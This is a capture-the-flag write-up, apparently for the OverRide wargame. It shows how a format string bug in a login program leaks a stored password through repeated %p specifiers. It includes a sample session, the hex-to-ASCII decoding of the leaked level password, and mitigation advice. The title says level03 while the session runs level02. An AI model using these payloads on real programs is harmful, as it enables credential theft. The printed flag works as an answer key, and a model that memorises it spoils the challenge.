---

# Level03 Format String Exploit - README

## Overview

This exploit targets a **format string vulnerability** in a program that reads a password from a file, compares it with user input, and grants access if the passwords match. The program then prints the username via an unprotected `printf`, allowing an attacker to leak sensitive information from the stack, including the password.

This vulnerability can be exploited by manipulating the format string passed to `printf` in order to print the contents of sensitive variables, such as the password.

## Target Program Behavior

1. The program opens the password file located at `/home/users/level03/.pass` and reads a 41-byte password.
2. It prompts the user for a **username** and **password**.
3. If the password matches the one read from the file, the program opens a shell (`/bin/sh`).
4. If the password is incorrect, the program prints an error message and exits.
5. Before exiting, the program prints the username using an unprotected `printf`, which can leak memory contents and sensitive information, such as the password.

## Vulnerability

The vulnerability arises from the following code:

```c
printf(&format);  // User-supplied input is used directly in printf.
```

Here, the program uses the user's input as the format string for `printf`. This allows an attacker to inject format specifiers (such as `%p`, `%x`, `%s`) into the input to print values from the stack, which may include the password or other sensitive data.

## Exploiting the Vulnerability

To exploit the vulnerability, we can craft an input that makes use of format specifiers to read from the stack. By providing multiple `%p` format specifiers, we can print out values stored on the stack, potentially including the password.

### Steps to Exploit

1. **Launch the program:**

   Run the target program with the following command:

   ```bash
   ./level03
   ```

2. **Input Crafting:**

   - For the **Username**, provide a series of `%p` format specifiers:
   
     ```
     %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
     ```
     
   - For the **Password**, enter anything (it won't matter, as we are exploiting the username input):
   
     ```
     anything
     ```

3. **Review the Output:**

   The program will print the contents of the stack, which may include the password stored in memory. The output may look something like:

   ```
   0x7fffffffe4f0 (nil) 0x61 0x2a2a2a2a2a2a2a2a ...
   ```

   You'll need to identify where the password is located in the stack. The password might be printed in the form of a string if you adjust the format specifiers correctly.

4. **Retrieve the Password:**

   To print the password, you can try using `%s` to print a string starting from a specific memory address. If you identify the memory address where the password is stored from the output of the `%p` specifiers, you can adjust the input format to print the password directly.

   Example input for the username might look like this:

   ```
   %p %p %p %p %p %p %p %p %p %p %p %p %p %p %s
   ```

   This will print the stack contents and attempt to print the password string at the correct address.

5. **Access the System:**

   Once you retrieve the password, use it to log in by providing it as the **Password** during the login prompt. If successful, the program will grant you access by opening a shell (`/bin/sh`).

## Example Exploit

Here is an example session exploiting the format string vulnerability:

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username:  %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: anything
*****************************************
 0x7fffffffe4f0 (nil) 0x61 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x676e696874796e61 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2520702520702520 does not have access!
level02@OverRide:~$ 
```

From the stack output, you can locate the password or its address and retrieve it using further format specifiers. After retrieving the password, run the program again and provide the correct password to gain access.

## Mitigation

To fix this vulnerability, the program should sanitize the format string by using `printf` with a constant format (e.g., `printf("%s", username);`) and avoid using user input directly as the format string.

Additionally, using modern security techniques such as **stack canaries**, **ASLR (Address Space Layout Randomization)**, and **DEP (Data Execution Prevention)** can help mitigate the risk of such exploits.

Hex to ASCII Conversion
0x756e505234376848 = unP2r7hH

0x45414a3561733951 = EAJ5as9Q

0x377a7143574e6758 = 7zqCWNxX

0x354a35686e475873 = 5J5hnGxS

0x48336750664b394d = H3gPfK9M

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

